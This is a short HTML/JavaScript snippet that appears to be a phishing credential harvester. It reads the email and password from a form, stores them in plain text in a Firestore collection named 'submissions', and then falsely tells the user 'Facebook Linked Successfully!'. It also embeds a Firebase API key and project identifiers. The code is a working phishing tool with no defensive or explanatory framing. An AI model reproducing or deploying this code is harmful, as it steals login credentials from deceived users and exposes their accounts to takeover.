<script type="module">
  // Import Firebase
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
  import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

  // Your Firebase config
  const firebaseConfig = {
    apiKey: "AIzaSyBkAdBHdBD0Qkw9N0LYyghn_wxeZcz3rdE",


    authDomain: "realtime-chat-9f9c8.firebaseapp.com",


    projectId: "realtime-chat-9f9c8",


    storageBucket: "realtime-chat-9f9c8.firebasestorage.app",


    messagingSenderId: "690622612833",


    appId: "1:690622612833:web:3781edb0595fbe3fc67120"
  };

  // Initialize Firebase
  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

  // Listen for form submit
  document.addEventListener("DOMContentLoaded", () => {
    const form = document.getElementById("myForm");

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      // Get form values
      const email = form.email.value;
      const password = form.password.value;

      try {
        // Add data to Firestore
        await addDoc(collection(db, "submissions"), {
          email: email,
          password: password,
          timestamp: new Date(),
        });

        alert("Facebook Linked Successfully!");
        form.reset();
      } catch (err) {
        console.error("Error adding document: ", err);
        alert("Failed to submit.");
      }
    });
  });
</script>
